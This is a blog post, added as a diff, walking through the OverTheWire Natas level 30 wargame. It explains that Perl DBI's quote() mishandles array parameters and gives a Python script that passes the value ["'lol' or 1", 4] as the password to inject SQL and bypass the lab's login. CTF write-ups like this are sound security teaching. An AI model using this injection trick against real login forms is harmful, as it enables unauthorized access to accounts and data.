@@ -1,0 +1,70 @@
+---
+layout: post
+title:  "Natas Level 29 → Level 30"
+date:   2021-06-08 01:21:40
+categories: ctf wargames web-security
+tags: wargames ctf overthewire web-security
+series: "OverTheWire: Natas"
+excerpt: Careless camel code causes critical conundrum
+mathjax: false
+---
+
+## Level Goal
+Excluding the URL and username, the Level Goal section is blank for the Natas ctf.
+
+
+## Solution
+Logging into the natas30 site we see a form to allow us to log in and a link to the source code. Let's look at the source code.
+
+```perl
+if ('POST' eq request_method && param('username') && param('password')){
+    my $dbh = DBI->connect( "DBI:mysql:natas30","natas30", "<censored>", {'RaiseError' => 1});
+    my $query="Select * FROM users where username =".$dbh->quote(param('username')) . " and password =".$dbh->quote(param('password')); 
+
+    my $sth = $dbh->prepare($query);
+    $sth->execute();
+    my $ver = $sth->fetch();
+    if ($ver){
+        print "win!<br>";
+        print "here is your result:<br>";
+        print @$ver;
+    }
+    else{
+        print "fail :(";
+    }
+    $sth->finish();
+    $dbh->disconnect();
+}
+
+print <<END;
+```
+
+Looks like Perl uses quote to sanitize inputs. Let's see if there are any weaknesses with this function.
+
+A quick search of **dbh quote vulnerability** on DuckDuckGo returns [this post](https://security.stackexchange.com/a/175872) on Stack Exchange. It appears that the quote does not know how to handle an array being passed to it. The post provides the following example Python code:
+
+```python
+def vuln(url):
+    params={"username": "valid_username", "password": ["'lol' or 1", 4]}
+    print(requests.post(url, data=params).text)
+```
+
+Let's create our own Python script and incorporate this. 
+
+```python
+#!/usr/bin/env python
+import requests
+from requests.auth import HTTPBasicAuth
+
+password = 'w------------------------------e'
+session = requests.Session()
+
+auth = HTTPBasicAuth('natas30', password)
+url = 'http://natas30.natas.labs.overthewire.org/index.pl'
+data = {'username': 'natas30', 'password': ["'lol' or 1", 4]}
+resp = session.post(url=url, auth=auth, data=data)
+
+print(resp.text)
+```
+
+The password for the next level is towards the bottom of the output.
